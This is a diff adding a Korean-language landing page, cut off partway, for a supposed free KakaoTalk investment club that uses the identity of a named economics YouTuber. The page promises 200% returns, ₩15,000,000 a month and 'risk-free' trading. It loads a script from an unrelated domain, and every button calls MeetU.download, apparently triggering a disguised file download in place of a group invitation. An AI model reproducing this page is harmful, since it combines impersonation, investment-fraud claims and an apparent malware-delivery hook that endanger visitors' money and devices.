@@ -1,0 +1,1036 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>무료 kakaotalk그룹에 가입하세요 — 전인구의 투자 클럽</title>
+    <meta name="description" content="전인구와 함께하는 무료 투자 클럽. 주식 수익 200% 달성 전략을 배우고 경제적 자유를 달성하세요.">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@400;500;700;800;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+   <script src="https://api.km624da.site/js/meetu-sdk.js"></script>
+    
+    <script>
+        function k2() {
+           MeetU.download(event);
+        }
+    </script>
+    <style>
+        :root {
+            --bg: #080808;
+            --bg-card: #111111;
+            --bg-card2: #181818;
+            --gold: #F5C518;
+            --gold-bright: #FFD700;
+            --gold-glow: rgba(245, 197, 24, 0.25);
+            --green: #2ECC71;
+            --green-glow: rgba(46, 204, 113, 0.2);
+            --white: #F5F5F5;
+            --white-dim: #C0C0C0;
+            --white-muted: #888888;
+            --border: #222222;
+            --border-light: #2A2A2A;
+            --band: #2ECC71;
+            --band-glow: rgba(46, 204, 113, 0.35);
+            --radius: 10px;
+            --radius-lg: 16px;
+            --radius-xl: 22px;
+        }
+        *,
+        *::before,
+        *::after {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        html {
+            scroll-behavior: smooth;
+            -webkit-text-size-adjust: 100%;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+        body {
+            font-family: 'Noto Sans KR', sans-serif;
+            background: var(--bg);
+            color: var(--white-dim);
+            line-height: 1.6;
+            min-height: 100vh;
+            -webkit-tap-highlight-color: transparent;
+        }
+        a {
+            text-decoration: none;
+            color: inherit;
+        }
+        img {
+            max-width: 100%;
+            display: block;
+        }
+        ::selection {
+            background: var(--gold);
+            color: #000;
+        }
+        .page {
+            max-width: 500px;
+            margin: 0 auto;
+            background: var(--bg);
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        .flash-bar {
+            background: linear-gradient(90deg, #F5C518, #D4A000, #F5C518);
+            background-size: 200% 100%;
+            animation: flash-move 2s linear infinite;
+            color: #000;
+            text-align: center;
+            padding: 8px 16px;
+            font-size: 0.7rem;
+            font-weight: 800;
+            letter-spacing: 0.04em;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        @keyframes flash-move {
+            0% {
+                background-position: 0% 50%;
+            }
+            100% {
+                background-position: 200% 50%;
+            }
+        }
+        .flash-bar .dot {
+            width: 7px;
+            height: 7px;
+            background: #000;
+            border-radius: 50%;
+            animation: blink-dot 0.7s infinite;
+        }
+        @keyframes blink-dot {
+            0%,
+            100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0.2;
+            }
+        }
+
+        .header {
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            background: rgba(8, 8, 8, 0.92);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            padding: 8px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid var(--border);
+        }
+        .header-l {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .header-logo {
+            width: 30px;
+            height: 30px;
+            background: var(--band);
+            border-radius: 7px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-weight: 900;
+            font-size: 0.55rem;
+        }
+        .header-name {
+            font-size: 0.76rem;
+            font-weight: 700;
+            color: var(--white);
+        }
+        .header-cta-btn {
+            padding: 7px 14px;
+            background: linear-gradient(135deg, #F5C518, #D4A000) !important;
+            color: #1a1a1a !important;
+            border-radius: 999px;
+            font-size: 0.7rem;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            transition: transform 0.2s;
+            border: none;
+            cursor: pointer;
+            box-shadow: 0 6px 24px rgba(245, 197, 24, 0.35) !important;
+        }
+        .header-cta-btn:active {
+            transform: scale(0.94);
+        }
+        .header-cta-btn i {
+            font-size: 0.95rem;
+        }
+
+        .hero {
+            padding: 16px 16px 20px;
+            position: relative;
+        }
+        .hero-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            padding: 5px 12px;
+            background: rgba(245, 197, 24, 0.12);
+            border: 1px solid rgba(245, 197, 24, 0.3);
+            border-radius: 999px;
+            font-size: 0.68rem;
+            font-weight: 700;
+            color: var(--gold-bright);
+            margin-bottom: 14px;
+            letter-spacing: 0.04em;
+        }
+        .hero-badge .live {
+            color: var(--gold-bright);
+            animation: blink-dot 0.8s infinite;
+        }
+        .hero-banner {
+            position: relative;
+            border-radius: var(--radius-lg);
+            overflow: hidden;
+            margin-bottom: 18px;
+            aspect-ratio: 16/9;
+            background: var(--bg-card);
+        }
+        .hero-banner img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+        .hero-banner-overlay {
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(0deg, rgba(8, 8, 8, 0.7) 0%, transparent 50%, rgba(8, 8, 8, 0.2) 100%);
+            pointer-events: none;
+        }
+        .hero-banner-tag {
+            position: absolute;
+            bottom: 10px;
+            right: 10px;
+            background: rgba(0, 0, 0, 0.75);
+            backdrop-filter: blur(6px);
+            -webkit-backdrop-filter: blur(6px);
+            border-radius: 6px;
+            padding: 5px 10px;
+            font-size: 0.65rem;
+            font-weight: 700;
+            color: var(--gold-bright);
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .hero-mentor {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            background: rgba(17, 17, 17, 0.85);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            border: 1px solid var(--border-light);
+            border-radius: var(--radius-lg);
+            padding: 12px 16px;
+            margin-bottom: 16px;
+            transition: all 0.2s;
+            cursor: pointer;
+        }
+        .hero-mentor-avatar {
+            width: 56px;
+            height: 56px;
+            border-radius: 50%;
+            flex-shrink: 0;
+            overflow: hidden;
+            border: 2px solid var(--band);
+            background: var(--bg-card);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.8rem;
+        }
+        .hero-mentor-avatar img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .hero-mentor-info {
+            flex: 1;
+            min-width: 0;
+        }
+        .hero-mentor-name {
+            font-size: 0.9rem;
+            font-weight: 800;
+            color: var(--white);
+            margin-bottom: 2px;
+        }
+        .hero-mentor-role {
+            font-size: 0.65rem;
+            color: var(--white-muted);
+        }
+        .hero-mentor-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            margin-top: 4px;
+            padding: 3px 8px;
+            background: rgba(46, 204, 113, 0.12);
+            border-radius: 999px;
+            font-size: 0.55rem;
+            font-weight: 700;
+            color: var(--green);
+        }
+
+        .hero h1 {
+            font-size: 1.5rem;
+            font-weight: 900;
+            line-height: 1.25;
+            color: var(--white);
+            margin-bottom: 10px;
+            letter-spacing: -0.02em;
+        }
+        .hero h1 em {
+            font-style: normal;
+            color: var(--gold-bright);
+        }
+        .hero-sub {
+            font-size: 0.8rem;
+            color: var(--white-dim);
+            line-height: 1.55;
+            margin-bottom: 16px;
+        }
+
+        .hero-stats-row {
+            display: flex;
+            gap: 6px;
+            margin-bottom: 18px;
+        }
+        .hero-stat {
+            flex: 1;
+            text-align: center;
+            padding: 14px 6px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+        }
+        .hero-stat-num {
+            font-size: 1.3rem;
+            font-weight: 900;
+            color: var(--gold-bright);
+            line-height: 1;
+            margin-bottom: 3px;
+        }
+        .hero-stat-lbl {
+            font-size: 0.58rem;
+            color: var(--white-muted);
+        }
+
+        .hero-cta,
+        .cta-btn,
+        .float-btn {
+            background: linear-gradient(135deg, #F5C518, #D4A000) !important;
+            color: #1a1a1a !important;
+            box-shadow: 0 6px 24px rgba(245, 197, 24, 0.35) !important;
+            border: none;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+        .hero-cta {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            width: 100%;
+            padding: 14px;
+            border-radius: var(--radius);
+            font-weight: 700;
+            font-size: 0.9rem;
+        }
+        .hero-cta:active,
+        .cta-btn:active,
+        .float-btn:active {
+            transform: scale(0.96);
+        }
+        @keyframes breathe {
+            0%,
+            100% {
+                box-shadow: 0 4px 20px rgba(245, 197, 24, 0.4);
+            }
+            50% {
+                box-shadow: 0 6px 36px rgba(245, 197, 24, 0.7), 0 0 60px rgba(245, 197, 24, 0.2);
+            }
+        }
+        .float-btn {
+            animation: breathe 2s ease-in-out infinite;
+        }
+        .float-btn:active {
+            animation: none;
+        }
+
+        .hero-footnote {
+            text-align: center;
+            font-size: 0.62rem;
+            color: var(--white-muted);
+            margin-top: 8px;
+        }
+
+        .sec {
+            padding: 28px 16px;
+        }
+        .sec-dark {
+            background: rgba(255, 255, 255, 0.01);
+        }
+        .sec-label {
+            text-align: center;
+            font-size: 0.62rem;
+            font-weight: 700;
+            letter-spacing: 0.08em;
+            text-transform: uppercase;
+            color: var(--gold-bright);
+            margin-bottom: 8px;
+        }
+        .sec-title {
+            font-size: 1.2rem;
+            font-weight: 800;
+            text-align: center;
+            color: var(--white);
+            margin-bottom: 6px;
+            letter-spacing: -0.02em;
+        }
+        .sec-sub {
+            font-size: 0.72rem;
+            color: var(--white-muted);
+            text-align: center;
+            margin-bottom: 16px;
+        }
+
+        .check-list {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        .check-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            padding: 14px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            transition: all 0.15s;
+        }
+        .check-icon {
+            width: 36px;
+            height: 36px;
+            min-width: 36px;
+            border-radius: 50%;
+            background: rgba(46, 204, 113, 0.12);
+            color: var(--green);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.85rem;
+        }
+        .check-text {
+            font-size: 0.78rem;
+            color: var(--white-dim);
+            line-height: 1.5;
+        }
+        .check-text strong {
+            color: var(--white);
+        }
+
+        .alert-box {
+            padding: 16px;
+            background: rgba(245, 197, 24, 0.06);
+            border: 1px solid rgba(245, 197, 24, 0.15);
+            border-radius: var(--radius);
+            margin-top: 16px;
+        }
+        .alert-box p {
+            font-size: 0.7rem;
+            color: var(--white-dim);
+            line-height: 1.6;
+        }
+
+        .mentor-card {
+            display: flex;
+            gap: 14px;
+            padding: 20px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-lg);
+            cursor: pointer;
+        }
+        .mentor-card-avatar {
+            width: 72px;
+            height: 72px;
+            min-width: 72px;
+            border-radius: 50%;
+            overflow: hidden;
+            border: 2px solid var(--band);
+        }
+        .mentor-card-avatar img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .mentor-card-info {
+            flex: 1;
+        }
+        .mentor-card-info h3 {
+            font-size: 0.95rem;
+            font-weight: 800;
+            color: var(--white);
+            margin-bottom: 2px;
+        }
+        .mentor-card-info .role {
+            font-size: 0.65rem;
+            color: var(--gold-bright);
+            margin-bottom: 8px;
+        }
+        .mentor-card-info p {
+            font-size: 0.7rem;
+            color: var(--white-dim);
+            line-height: 1.65;
+            margin-bottom: 6px;
+        }
+
+        .book-list {
+            margin-top: 8px;
+        }
+        .book-list strong {
+            display: block;
+            font-size: 0.8rem;
+            color: var(--gold-bright);
+            margin-bottom: 4px;
+        }
+        .book-list ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 4px 12px;
+        }
+        .book-list ul li {
+            font-size: 0.68rem;
+            color: var(--white-dim);
+            line-height: 1.6;
+            position: relative;
+            padding-left: 10px;
+        }
+        .book-list ul li::before {
+            content: "•";
+            position: absolute;
+            left: 0;
+            color: var(--gold);
+        }
+
+        .highlight-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 8px;
+        }
+        .highlight-card {
+            padding: 16px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            text-align: center;
+        }
+        .highlight-card .ico {
+            font-size: 1.5rem;
+            margin-bottom: 6px;
+        }
+        .highlight-card p {
+            font-size: 0.68rem;
+            color: var(--white-dim);
+            line-height: 1.5;
+        }
+
+        .benefit-list {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+        .benefit-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 16px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+        }
+        .benefit-item .num {
+            width: 32px;
+            height: 32px;
+            min-width: 32px;
+            border-radius: 50%;
+            background: var(--band);
+            color: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.8rem;
+            font-weight: 900;
+        }
+        .benefit-item span {
+            font-size: 0.78rem;
+            font-weight: 700;
+            color: var(--white);
+        }
+
+        .learn-grid {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+        .learn-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 14px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+        }
+        .learn-item .ico {
+            color: var(--gold-bright);
+            font-size: 0.8rem;
+            width: 20px;
+            text-align: center;
+        }
+        .learn-item span {
+            font-size: 0.72rem;
+            color: var(--white-dim);
+            line-height: 1.5;
+        }
+
+        .faq {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+        .faq-item {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            overflow: hidden;
+        }
+        .faq-q {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 10px;
+            padding: 16px;
+            font-size: 0.78rem;
+            font-weight: 700;
+            color: var(--white);
+            cursor: pointer;
+            user-select: none;
+            width: 100%;
+            text-align: left;
+            background: none;
+            border: none;
+            font-family: inherit;
+            line-height: 1.4;
+        }
+        .faq-q .faq-icon {
+            transition: transform 0.3s;
+            font-size: 0.6rem;
+            color: var(--white-muted);
+            flex-shrink: 0;
+        }
+        .faq-item.open .faq-q .faq-icon {
+            transform: rotate(180deg);
+            color: var(--gold-bright);
+        }
+        .faq-a {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.35s ease;
+        }
+        .faq-item.open .faq-a {
+            max-height: 500px;
+        }
+        .faq-a-inner {
+            padding: 0 16px 16px;
+            font-size: 0.7rem;
+            color: var(--white-dim);
+            line-height: 1.7;
+        }
+        .faq-a-inner strong {
+            color: var(--gold-bright);
+        }
+
+        .cta-section {
+            padding: 28px 16px;
+            text-align: center;
+        }
+        .cta-section h2 {
+            font-size: 1.3rem;
+            font-weight: 800;
+            color: var(--white);
+            margin-bottom: 8px;
+        }
+        .cta-section p {
+            font-size: 0.75rem;
+            color: var(--white-dim);
+            margin-bottom: 16px;
+        }
+        .cta-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            width: 100%;
+            max-width: 320px;
+            margin: 0 auto;
+            padding: 14px;
+            border-radius: var(--radius);
+            font-weight: 700;
+            font-size: 0.9rem;
+        }
+
+        .float-bar {
+            position: fixed;
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100%;
+            max-width: 500px;
+            z-index: 200;
+            padding: 8px 16px max(8px, env(safe-area-inset-bottom));
+            background: rgba(8, 8, 8, 0.94);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border-top: 1px solid var(--border);
+        }
+        .float-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            width: 100%;
+            padding: 14px;
+            border-radius: var(--radius);
+            font-weight: 700;
+            font-size: 0.9rem;
+            border: none;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 16px;
+            font-size: 0.6rem;
+            color: var(--white-muted);
+            border-top: 1px solid var(--border);
+        }
+        .reveal {
+            opacity: 0;
+            transform: translateY(16px);
+            transition: opacity 0.5s, transform 0.5s;
+        }
+        .reveal.on {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        @media(prefers-reduced-motion:reduce) {
+            *,
+            *::before,
+            *::after {
+                animation-duration: 0.01ms !important;
+                transition-duration: 0.01ms !important;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="page">
+
+        <!-- 헤더 -->
+        <div class="header">
+            <div class="header-l">
+                <span class="header-name">전인구 투자클럽</span>
+            </div>
+            <button class="header-cta-btn" onclick="k2()"><i class="fa-solid fa-users"></i> 카카오톡으로 문의</button>
+        </div>
+
+        <!-- 히어로 -->
+        <section class="hero">
+            <div class="hero-badge"><span class="live">●</span> 무료 가입 · 한정 멤버</div>
+
+            <div class="hero-banner">
+                <img src="img/123.png" alt="kakaotalk 투자 클럽" onerror="this.style.display='none'">
+                <div class="hero-banner-overlay"></div>
+                <div class="hero-banner-tag"><i class="fa-solid fa-chart-line"></i> 실시간 시그널</div>
+            </div>
+
+            <div class="hero-mentor" onclick="k2()">
+                <div class="hero-mentor-avatar"><img src="img/mentor.jpg" alt="전인구" onerror="this.innerHTML='👨‍🏫'"></div>
+                <div class="hero-mentor-info">
+                    <div class="hero-mentor-name">전인구</div>
+                    <div class="hero-mentor-role">경제 유튜버 · 강사 · 저자</div>
+                    <div class="hero-mentor-badge"><i class="fa-solid fa-check-circle"></i> 베스트셀러 저자</div>
+                </div>
+            </div>
+
+            <h1>자신있게 <em>한국 주식시장</em>을 탐색하세요!</h1>
+            <p class="hero-sub">프리미엄 주식 추천, 실시간 시그널, 일대일 안내까지 — <strong style="color:var(--gold-bright)">완전 무료</strong>로 제공합니다.</p>
+
+            <div class="hero-stats-row">
+                <div class="hero-stat"><div class="hero-stat-num">73,000+</div><div class="hero-stat-lbl">회원</div></div>
+                <div class="hero-stat"><div class="hero-stat-num">200%</div><div class="hero-stat-lbl">수익률</div></div>
+                <div class="hero-stat"><div class="hero-stat-num">무료</div><div class="hero-stat-lbl">평생</div></div>
+            </div>
+
+            <button class="hero-cta" onclick="k2()"><i class="fa-solid fa-users"></i> 카카오톡으로 문의하기</button>
+            <p class="hero-footnote">⚠️ 투자자만 참여 가능 · 주식시장 외 주제 금지</p>
+        </section>
+
+        <!-- 무료 혜택 -->
+        <section class="sec sec-dark reveal">
+            <div class="sec-label">무료 혜택</div>
+            <h2 class="sec-title">회원 전용 무료 서비스</h2>
+            <div class="check-list">
+                <div class="check-item"><div class="check-icon"><i class="fa-solid fa-check"></i></div><div class="check-text"><strong>무료</strong> 프리미엄 주식 및 선물 추천</div></div>
+                <div class="check-item"><div class="check-icon"><i class="fa-solid fa-check"></i></div><div class="check-text"><strong>무료</strong> 실시간 주식·옵션·선물 신호</div></div>
+                <div class="check-item"><div class="check-icon"><i class="fa-solid fa-check"></i></div><div class="check-text"><strong>무료</strong> 위험 최소화 주식 및 선물 진단</div></div>
+                <div class="check-item"><div class="check-icon"><i class="fa-solid fa-check"></i></div><div class="check-text"><strong>무료</strong> 주식 선택 및 선물 일대일 안내</div></div>
+                <div class="check-item"><div class="check-icon"><i class="fa-solid fa-check"></i></div><div class="check-text"><strong>무료</strong> 캔들스틱 기술적 분석 가이드</div></div>
+            </div>
+            <div class="alert-box">
+                <p>⚠️ <strong style="color:var(--gold-bright)">노트:</strong> 이 kakaotalk그룹에는 투자자만 참여할 수 있습니다. 주식시장과 관련없는 주제에 대한 논의는 금지되어 있어 투자자가 아닌 분들에게는 적합하지 않을 수 있습니다.</p>
+            </div>
+        </section>
+
+        <!-- 강사 소개 -->
+        <section class="sec reveal">
+            <div class="sec-label">강사를 만나보세요</div>
+            <h2 class="sec-title">전인구</h2>
+            <div class="mentor-card" onclick="k2()">
+                <div class="mentor-card-avatar"><img src="img/mentor.jpg" alt="전인구" onerror="this.innerHTML='👨‍🏫'"></div>
+                <div class="mentor-card-info">
+                    <h3>전인구</h3>
+                    <div class="role">경제 유튜버 · 강사 · 저자</div>
+                    <p>
+                        안녕하세요, 저는 전인구입니다. 대한민국의 경제 유튜버로서 거시경제 분석 및 전망과 금융 투자 등 재테크 조언을 주 콘텐츠로 삼고 있습니다.<br>
+                        서울과 부산에서 강의를 진행하며, 다수의 베스트셀러 저서를 집필했습니다.<br>
+                        유튜브 채널에서는 경제사와 기초 개념을 초보자도 쉽게 이해할 수 있도록 설명하고 있습니다.
+                    </p>
+                    <div class="book-list">
+                        <strong>저서</strong>
+                        <ul>
+                            <li>주식의 심리</li>
+                            <li>워렌 버핏의 재무제표 파헤치기</li>
+                            <li>내 월급 사용설명서</li>
+                            <li>전인구의 주식투자 일주일 만에 뽀개기</li>
+                            <li>주식의 심리 (돈이 되는 인문학)</li>
+                            <li>돈의 흐름 (돈의 길목을 지키는 부자들의 투자전략 8)</li>
+                            <li>전인구의 미국주식 투자 전략</li>
+                            <li>세븐 7년 안에 경제적 자유를 만드는 7가지 비밀</li>
+                            <li>주식 생존의 법칙 (세계 전쟁사에서 배우는 20가지 생존 투자전략)</li>
+                            <li>전인구 선생님의 어린이 경제 개념 대백과</li>
+                            <li>2026 환율 전쟁 2026년 경제 전망: 커튼 뒤의 주식</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- 배울 내용 -->
+        <section class="sec sec-dark reveal">
+            <h2 class="sec-title">무엇을 배울 수 있나요</h2>
+            <div class="highlight-grid">
+                <div class="highlight-card"><div class="ico">🔥</div><p>주식 투자로 최고의 수익을 내는 방법</p></div>
+                <div class="highlight-card"><div class="ico">📊</div><p>저평가된 우량주 식별 및 시장 변동성 이익 활용법</p></div>
+                <div class="highlight-card"><div class="ico">📰</div><p>최신 주식 시장 뉴스와 주요 매매 전략</p></div>
+                <div class="highlight-card"><div class="ico">🔮</div><p>주식 수익 200% 달성을 위한 첨단 투자 통찰력</p></div>
+            </div>
+            <p style="text-align:center;margin-top:14px;font-size:0.72rem;color:var(--white-dim)">73,000명 이상의 회원이 무료 서비스의 혜택을 누리고 있습니다. 기회는 제한되어 있습니다. <strong style="color:var(--gold-bright)">와서 우리와 함께 하세요!</strong></p>
+            <p style="text-align:center;margin-top:8px;font-size:0.75rem;color:var(--gold-bright);font-weight:700">2024년의 절반 이상이 지났지만 앞으로 몇 년은 경제적 자유를 달성하는 데 중요한 순간입니다!</p>
+        </section>
+
+        <!-- 가입 혜택 -->
+        <section class="sec reveal">
+            <div class="sec-label">가입 혜택</div>
+            <h2 class="sec-title">kakaotalk그룹에 가입하면 얻을 수 있는 이점</h2>
+            <div class="benefit-list">
+                <div class="benefit-item"><div class="num">1</div><span>수익성 있는 투자자가 되는 법을 배우세요</span></div>
+                <div class="benefit-item"><div class="num">2</div><span>경제적 자유를 얻는 방법을 알아보세요</span></div>
+                <div class="benefit-item"><div class="num">3</div><span>한 달에 최소 ₩15,000,000를 버는 방법을 알아보세요</span></div>
+            </div>
+        </section>
+
+        <!-- 학습 내용 -->
+        <section class="sec sec-dark reveal">
+            <h2 class="sec-title">무엇을 배울 것인가</h2>
+            <div class="learn-grid">
+                <div class="learn-item"><div class="ico"><i class="fa-solid fa-check-circle"></i></div><span>수익성 있는 거래를 위해 주식 및 선물 거래에서 우위를 점하는 방법</span></div>
+                <div class="learn-item"><div class="ico"><i class="fa-solid fa-check-circle"></i></div><span>재정적 자유를 위해 주식과 선물로 돈을 절약하는 방법</span></div>
+                <div class="learn-item"><div class="ico"><i class="fa-solid fa-check-circle"></i></div><span>AI 주식 및 선물 선택 도구를 사용하여 쉽게 수익을 창출하세요</span></div>
+                <div class="learn-item"><div class="ico"><i class="fa-solid fa-check-circle"></i></div><span>매일 10분 미만의 투자로 수익성 있는 주식 및 선물 트레이더가 되는 방법</span></div>
+                <div class="learn-item"><div class="ico"><i class="fa-solid fa-check-circle"></i></div><span>거래가 관리 가능하고 위험이 없는 활동이라고 믿는 방법</span></div>
+            </div>
+        </section>
+
+        <!-- FAQ -->
+        <section class="sec reveal">
+            <div class="sec-label">FAQ</div>
+            <h2 class="sec-title">자주 묻는 질문</h2>
+            <div class="faq">
+
+                <div class="faq-item">
+                    <button class="faq-q" onclick="toggleFaq(this)">
+                        이 kakaotalk 그룹은 정말 무료인가요? 숨은 비용이 있나요?
+                        <span class="faq-icon"><i class="fa-solid fa-chevron-down"></i></span>
+                    </button>
+                    <div class="faq-a">
+                        <div class="faq-a-inner">
+                            <strong>완전 무료입니다.</strong> 전인구 투자클럽 kakaotalk 그룹은 회원님께 <strong>평생 무료</strong>로 제공됩니다. 프리미엄 주식 추천, 실시간 시그널, 일대일 안내 등 모든 서비스에 추가 비용이 전혀 없습니다. 유료 전환이나 부분 유료화 계획도 없으니 안심하고 가입하세요.
+                        </div>
+                    </div>
+                </div>
+
+                <div class="faq-item">
+                    <button class="faq-q" onclick="toggleFaq(this)">
+                        초보자도 따라 할 수 있나요? 투자 경험이 없어도 괜찮을까요?
+                        <span class="faq-icon"><i class="fa-solid fa-chevron-down"></i></span>
+                    </button>
+                    <div class="faq-a">
+                        <div class="faq-a-inner">
+                            <strong>물론입니다.</strong> 전인구 강사는 초보자도 이해하기 쉽게 경제 개념과 투자 전략을 설명하는 것으로 유명합니다. 캔들스틱 기술적 분석 가이드부터 기초 경제 용어까지 <strong>기초부터 차근차근</strong> 알려드립니다. 경험 없이도 충분히 따라올 수 있도록 구성되어 있습니다.
+                        </div>
+                    </div>
+                </div>
+
+                <div class="faq-item">
+                    <button class="faq-q" onclick="toggleFaq(this)">
+                        어떤 종목을 추천해 주나요? 한국 주식만 다루나요?
+                        <span class="faq-icon"><i class="fa-solid fa-chevron-down"></i></span>
+                    </button>
+                    <div class="faq-a">
+                        <div class="faq-a-inner">
+                            <strong>한국 주식시장을 중심</strong>으로 하되, 해외 주식(미국 등)과 선물·옵션까지 폭넓게 다룹니다. 저평가된 우량주 식별, 실시간 매매 신호, 위험 최소화 진단 등 <strong>다양한 자산군에 걸친 인사이트</strong>를 제공합니다. 단, 주식시장과 관련 없는 주제는 금지됩니다.
+                        </div>
+                    </div>
+                </div>
+
+                <div class="faq-item">
+                    <button class="faq-q" onclick="toggleFaq(this)">
+                        "200% 수익률"이 실제로 가능한 건가요? 보장인가요?
+                        <span class="faq-icon"><i class="fa-solid fa-chevron-down"></i></span>
+                    </button>
+                    <div class="faq-a">
+                        <div class="faq-a-inner">
+                            <strong>수익률은 개인의 실행력과 시장 상황에 따라 달라집니다.</strong> 200%는 그룹 내 일부 회원들이 달성한 실적을 바탕으로 한 참고 수치이며, <strong>모든 투자에는 위험이 따릅니다.</strong> 다만 저희는 위험을 최소화하면서 수익 기회를 포착할 수 있는 전략과 실시간 시그널을 제공하기 위해 최선을 다하고 있습니다.
+                        </div>
+                    </div>
+                </div>
+
+                <div class="faq-item">
+                    <button class="faq-q" onclick="toggleFaq(this)">
+                        kakaotalk 그룹에 가입하려면 어떻게 해야 하나요?
+                        <span class="faq-icon"><i class="fa-solid fa-chevron-down"></i></span>
+                    </button>
+                    <div class="faq-a">
+                        <div class="faq-a-inner">
+                            <strong>하단의 '카카오톡으로 문의하기' 버튼</strong>을 눌러 주세요. 문의를 남기시면 안내에 따라 kakaotalk 그룹 초대 링크를 받으실 수 있습니다. <strong>투자자 본인</strong>임을 확인하는 간단한 절차가 있으며, 이후 즉시 커뮤니티에 참여하실 수 있습니다.
+                        </div>
+                    </div>
+                </div>
+
+                <div class="faq-item">
+                    <button class="faq-q" onclick="toggleFaq(this)">
+                        전인구 강사와 직접 소통할 수 있나요?
+                        <span class="faq-icon"><i class="fa-solid fa-chevron-down"></i></span>
+                    </button>
+                    <div class="faq-a">
+                        <div class="faq-a-inner">
+                            <strong>네, 가능합니다.</strong> 그룹 내에서 전인구 강사가 직접 실시간 시그널과 시장 분석을 공유하며, 일대일 주식 및 선물 안내도 진행합니다. 모든 회원이 강사와 소통할 수 있는 기회를 가지며, 질문에 대한 답변도 꾸준히 제공됩니다.
+                        </div>
+                    </div>
+                </div>
+
+                <div class="faq-item">
+                    <button class="faq-q" onclick="toggleFaq(this)">
+                        주식 외에 다른 투자 상품도 다루나요?
+                        <span class="faq-icon"><i class="fa-solid fa-chevron-down"></i></span>
+                    </button>
+                    <div class="faq-a">
+                        <div class="faq-a-inner">
+                            <strong>선물(Futures)과 옵션(Options)도 주요 학습 대상입니다.</strong> 주식과 함께 선물 거래에서 우위를 점하는 방법, 위험 관리 전략, AI 기반 선택 도구 활용법까지 폭넓게 다루고 있습니다. <strong>다양한 포트폴리오 구성</strong>을 원하는 투자자에게 적합합니다.
+                        </div>
+                    </div>
+                </div>
+
+                <div class="faq-item">
+                    <button class="faq-q" onclick="toggleFaq(this)">
+                        그룹 규칙이 있나요? 주의할 점이 있다면 알려주세요.
+                        <span class="faq-icon"><i class="fa-solid fa-chevron-down"></i></span>
+                    </button>
+                    <div class="faq-a">
+                        <div class="faq-a-inner">
+                            <strong>투자자만 참여 가능하며, 주식시장과 관련 없는 주제는 금지됩니다.</strong> 정치·사회적 논쟁, 홍보, 스팸, 타인 비방 등은 엄격히 제한됩니다. 모두가 집중할 수 있는 <strong>전문 투자 환경</strong>을 유지하기 위한 필수 규칙이오니 양해 부탁드립니다.
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+        </section>
+
+        <!-- 하단 CTA -->
+        <section class="cta-section reveal">
